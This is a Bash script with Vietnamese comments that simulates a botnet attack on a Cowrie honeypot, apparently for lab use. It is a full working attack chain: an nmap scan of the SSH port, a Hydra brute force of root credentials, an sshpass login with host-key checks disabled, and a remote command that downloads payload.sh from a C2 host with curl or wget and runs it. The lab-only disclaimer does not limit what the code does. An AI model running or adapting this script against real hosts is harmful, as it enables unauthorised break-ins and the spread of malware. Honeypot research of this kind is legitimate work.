#!/usr/bin/env bash
# ============================================
# Mô phỏng botnet cho Cowrie (T-Pot) - BẢN ỔN ĐỊNH
# Chỉ dùng trong LAB / HONEYPOT hợp pháp (VD: T-Pot).
# ============================================

set -euo pipefail

# --------- Tham số & mặc định ----------
TPOT_IP="${1:-}"
KALI_IP="${2:-}"
TPOT_PORT="${3:-${TPOT_PORT:-22}}"

usage() { echo "Usage: $0 <T-POT_IP> <KALI_IP> [TPOT_PORT]"; exit 1; }
[[ -z "${TPOT_IP}" || -z "${KALI_IP}" ]] && usage

# --------- Tiện ích ----------
say()  { printf "%s\n" "$*"; }
need() { command -v "$1" >/dev/null 2>&1 || { say "[!] Thiếu công cụ: $1"; exit 1; }; }

for t in nmap hydra sshpass curl awk sed grep; do need "$t"; done
# wget có thể thiếu, nhưng ta sẽ fallback (curl || wget) trên máy đích.

TMPDIR="$(mktemp -d)"
cleanup() {
  rm -rf "$TMPDIR" 2>/dev/null || true
}
trap cleanup EXIT

# --------- Kiểm tra C2 ----------
say "[*] Kiểm tra C2: http://${KALI_IP}:8080/payload.sh ..."
if ! curl -fsS --max-time 5 "http://${KALI_IP}:8080/payload.sh" >/dev/null; then
  say "[!] Không truy cập được payload.sh tại ${KALI_IP}:8080"
  say "    - Trên Kali:  cd ~/c2server && python3 -m http.server 8080"
  say "    - Firewall:   sudo ufw allow 8080/tcp (nếu dùng ufw)"
  exit 2
fi
say "[+] C2 OK."

# --------- Quét cổng ----------
say "[*] Quét cổng SSH ${TPOT_IP}:${TPOT_PORT} ..."
# Không fail nếu nmap non-zero (dùng || true)
nmap -sT -Pn -p "${TPOT_PORT}" "${TPOT_IP}" || true

# --------- Chuẩn bị wordlists ----------
say "[*] Chuẩn bị danh sách user/pass ..."
USERS="${TMPDIR}/users.txt"
PWDS="${TMPDIR}/pass.txt"
printf "root\n" > "${USERS}"
cat > "${PWDS}" <<'EOF'
root
admin
123456
password
EOF

# --------- Brute-force với Hydra ----------
say "[*] Brute-force bằng Hydra ..."
HYDRA_OUT="${TMPDIR}/hydra.out"
# -f: dừng khi tìm thấy cặp hợp lệ
# -t 4: 4 thread là đủ cho lab
# -s: port SSH tuỳ chọn
hydra -L "${USERS}" -P "${PWDS}" -t 4 -V -f -o "${HYDRA_OUT}" "ssh://${TPOT_IP}" -s "${TPOT_PORT}" || true

# --------- Parse kết quả ----------
USER_FOUND="$(awk '/\[ssh\] host:/ && /login:/ && /password:/ {for(i=1;i<=NF;i++){if($i=="login:"){u=$(i+1)}; if($i=="password:"){p=$(i+1)}}; if(u!="" && p!=""){print u; exit}}' "${HYDRA_OUT}" || true)"
PASS_FOUND="$(awk '/\[ssh\] host:/ && /login:/ && /password:/ {for(i=1;i<=NF;i++){if($i=="login:"){u=$(i+1)}; if($i=="password:"){p=$(i+1)}}; if(u!="" && p!=""){print p; exit}}' "${HYDRA_OUT}" || true)"

if [[ -n "${USER_FOUND}" && -n "${PASS_FOUND}" ]]; then
  USER="${USER_FOUND}"
  PASS="${PASS_FOUND}"
  say "[+] Tìm thấy cred từ Hydra: ${USER} / ${PASS}"
else
  say "[!] Hydra KHÔNG tìm thấy cred → dùng mặc định LAB: root / admin"
  USER="root"
  PASS="admin"
fi

# --------- Chuỗi lệnh từ xa (một dòng) ----------
# Dùng sh -lc để có login shell nhẹ, dùng ; thay vì && để giảm rủi ro 'gãy dòng'
# Ưu tiên curl, fallback wget. Không dùng subshell () để hợp thức với shell tối giản.
REMOTE_CMD=$(
  cat <<EOF
sh -lc 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; \
  (curl -fsS http://${KALI_IP}:8080/payload.sh -o payload.sh || \
   wget -qO payload.sh http://${KALI_IP}:8080/payload.sh); \
  chmod +x payload.sh; ./payload.sh'
EOF
)

# --------- SSH thực thi ----------
say "[*] SSH vào Cowrie & chạy chuỗi lệnh tải/chạy payload ..."
set +e
sshpass -p "${PASS}" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o PreferredAuthentications=password \
  -o PubkeyAuthentication=no \
  -o ConnectTimeout=8 \
  -o ServerAliveInterval=5 \
  -o ServerAliveCountMax=2 \
  -p "${TPOT_PORT}" \
  -tt "${USER}@${TPOT_IP}" "${REMOTE_CMD}"
SSH_RC=$?
set -e

if [[ ${SSH_RC} -ne 0 ]]; then
  say "[!] SSH/Payload lỗi (mã: ${SSH_RC}). Có thể do Cowrie đóng phiên hoặc shell không hỗ trợ."
  say "    Thử bỏ pseudo-TTY: đổi -tt thành -T, hoặc rút gọn REMOTE_CMD."
  exit 3
fi

say "[+] Hoàn tất mô phỏng botnet."
exit 0
